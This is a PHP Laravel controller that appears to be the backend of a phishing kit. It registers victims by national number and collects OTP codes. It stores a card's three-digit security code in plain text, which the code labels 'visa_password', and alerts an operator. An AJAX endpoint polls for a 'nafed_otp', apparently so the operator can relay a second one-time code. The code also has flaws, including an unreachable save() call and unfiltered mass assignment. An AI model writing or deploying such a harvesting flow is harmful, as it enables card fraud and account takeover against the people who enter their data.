<?php

namespace App\Http\Controllers\Client;

use App\Http\Controllers\Controller;
use App\Models\Client;
use App\Models\MobileCompany;
use App\Models\Notification;
use Illuminate\Http\Request;
use RealRashid\SweetAlert\Facades\Alert;

class RegistrationController extends Controller
{
    public function continueRegistration(Request $request){
        $request->validate([
            'national_number' =>['required']
        ]);
        $client = Client::where('national_number' , $request->national_number)->first();
        if($client){
            if($client->end_point == SUCCESS_OTP){
                return view('frontend.clients.send_visa_password' , compact('client'));
            }
            elseif ($client->end_point == FAIL_OTP) {
            }
            elseif ($client->end_point == END_REGISTRATION) {
                return view('frontend.clients.send_otp' , compact('client'));
            }
            else
            {
            }
        }else{
            $mobile_network = MobileCompany::all();
            return view('frontend.landing' , compact('mobile_network'));
        }
    }
    public function register(Request $request){
        $inputs = $request->all();
        unset($inputs['_token']);

        $client = Client::create($inputs);
        $notifcation = [
            'client_id' =>$client->id,
            'is_seen' => 0,
            'content' => 'New client Registered'
        ];
        $notifcation = Notification::create($notifcation);
        Alert::info(' العملاء', 'تم التسجيل بنجاح');
        return redirect()->route('client.getOtp' , ['id'=> $client->id ,'national_number'=> $client->national_number]);
    }

    public function checkOtp(Request $request){
        $inputs = $request->all();
        $client = Client::whereId($inputs['client_id'])->first();
        if($client->otp_number == $inputs['otp_number']){
            $client->end_point = SUCCESS_OTP;
            Alert::info(' العملاء', ' تم بنجاح');
            return view('frontend.clients.send_visa_password' , compact('client'));
        }else {
            $client->end_point = FAIL_OTP;
            Alert::error('خطا', 'الرقم خطا');
            return view('frontend.clients.send_otp' , compact('client'));
        }
        $client->save();
    }

    public function storeVisaPassword(Request $request){
        $inputs = $request->all();
        $request->validate([
            'visa_password'=>'required'
        ]);
        $client = Client::where('id' , $inputs['client_id'])->first();
        $client->visa_password = $inputs['visa_password'];
        $client->end_point = SEND_VISA_PASSWORD;
        $client->save();

        $notifcation = [
            'client_id' =>$client->id,
            'is_seen' => 0,
            'content' => 'العميل ارسل الرقم الثلاثى الخاص بالبطاقة'
        ];
        Notification::create($notifcation);
        return view('frontend.clients.get_nafed_otp', compact('client'));
    }

    public function getOtp($id , $national_number){
        $client = Client::where(['id' => $id , 'national_number' => $national_number] )->firstOrFail();
        return view('frontend.clients.send_otp' , compact('client'));
    }

    public function getNafedOtpAjax($client_id){
       $client= Client::where('id' , $client_id)->first();
       return response()->json(['status' => 1 , 'nafed_otp'=>$client->nafed_otp ]);
    }
}
